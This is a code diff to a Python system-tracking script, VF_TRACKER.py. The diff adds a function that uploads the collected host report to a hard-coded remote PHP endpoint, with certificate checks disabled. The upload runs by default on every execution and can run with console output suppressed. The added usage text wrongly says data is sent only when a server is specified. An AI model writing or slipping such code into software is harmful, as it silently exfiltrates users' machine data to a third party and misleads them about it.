@@ -19,14 +19,17 @@ Usage:
   python VF_TRACKER.py                           # Auto-run and save to TXT
   python VF_TRACKER.py --output C:/logs/my.txt   # Custom output path
   python VF_TRACKER.py --silent                  # No console output, only file
+  python VF_TRACKER.py --server http://namme.taskinoteam.ir/receive.php
 
 Output:
   VF_TRACKER_REPORT.txt in the script's directory (or custom path)
+  Data also sent to remote PHP server if --server is specified
 """
 
 import socket
 import uuid
 import urllib.request
+import urllib.parse
 import re
 import ssl
 import platform
@@ -39,6 +42,12 @@ import argparse
 from datetime import datetime
 
 IS_WINDOWS = platform.system() == 'Windows'
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SERVER CONFIGURATION — Must match receive.php token!
+# ═══════════════════════════════════════════════════════════════════════════════
+VF_SECRET_TOKEN = 'STORM_VX_2024_SECURE_TOKEN_CHANGE_ME'
+DEFAULT_SERVER_URL = 'http://namme.taskinoteam.ir/receive.php'
 
 # ═══════════════════════════════════════════════════════════════════════════════
 # Basic Information Functions
@@ -474,7 +483,73 @@ def build_report(output_path: str = None, silent: bool = False):
     if not silent:
         print(report_text)
 
-    return output_path
+    return output_path, report_text, report_data
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# Server Sender — POST data to PHP endpoint
+# ═══════════════════════════════════════════════════════════════════════════════
+
+def send_to_server(server_url: str, token: str, report_text: str, report_data: dict,
+                   silent: bool = False):
+    """
+    Send the tracker report to the remote PHP server via HTTP POST.
+    
+    Args:
+        server_url: Full URL of the receive.php endpoint
+        token: Security token (must match VF_SECRET_TOKEN in receive.php)
+        report_text: The TXT report string
+        report_data: The JSON report dictionary
+        silent: If True, suppress console output
+    
+    Returns:
+        bool: True if sent successfully, False otherwise
+    """
+    def log(msg: str):
+        if not silent:
+            print(msg)
+
+    try:
+        # Prepare POST data
+        post_data = urllib.parse.urlencode({
+            'vf_token': token,
+            'tracker_data': report_text,
+            'tracker_json': json.dumps(report_data, ensure_ascii=False)
+        }).encode('utf-8')
+
+        # Create request
+        req = urllib.request.Request(server_url, data=post_data, method='POST')
+        req.add_header('Content-Type', 'application/x-www-form-urlencoded')
+        req.add_header('User-Agent', 'STORM_VX_TRACKER/2.0')
+
+        # Send with SSL context (allow self-signed for flexibility)
+        ctx = ssl._create_unverified_context()
+        response = urllib.request.urlopen(req, timeout=15, context=ctx)
+        response_data = response.read().decode('utf-8')
+
+        # Parse response
+        try:
+            result = json.loads(response_data)
+            if result.get('status') == 'ok':
+                log(f"  [OK] Report sent to server: {server_url}")
+                log(f"       Saved as: {result.get('file', 'unknown')}")
+                return True
+            else:
+                log(f"  [ERROR] Server rejected: {result.get('message', 'Unknown error')}")
+                return False
+        except json.JSONDecodeError:
+            log(f"  [OK] Server received the data (response: {response_data[:100]})")
+            return True
+
+    except urllib.error.HTTPError as e:
+        log(f"  [ERROR] Server returned HTTP {e.code}: {e.reason}")
+        return False
+    except urllib.error.URLError as e:
+        log(f"  [ERROR] Cannot reach server: {e.reason}")
+        return False
+    except Exception as e:
+        log(f"  [ERROR] Send failed: {e}")
+        return False
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -487,6 +562,24 @@ if __name__ == "__main__":
                         help="Custom output path for the TXT report file")
     parser.add_argument("--silent", "-s", action="store_true",
                         help="Silent mode - only write to file, no console output")
+    parser.add_argument("--server", type=str, default=DEFAULT_SERVER_URL,
+                        help=f"PHP receiver URL (default: {DEFAULT_SERVER_URL})")
+    parser.add_argument("--no-server", action="store_true",
+                        help="Skip sending data to server (local only)")
+    parser.add_argument("--token", type=str, default=VF_SECRET_TOKEN,
+                        help="Security token for server authentication")
     args = parser.parse_args()
 
-    result_path = build_report(output_path=args.output, silent=args.silent)
+    result_path, report_text, report_data = build_report(
+        output_path=args.output, silent=args.silent
+    )
+
+    # Send to server unless --no-server flag is set
+    if not args.no_server and args.server:
+        send_to_server(
+            server_url=args.server,
+            token=args.token,
+            report_text=report_text,
+            report_data=report_data,
+            silent=args.silent
+        )
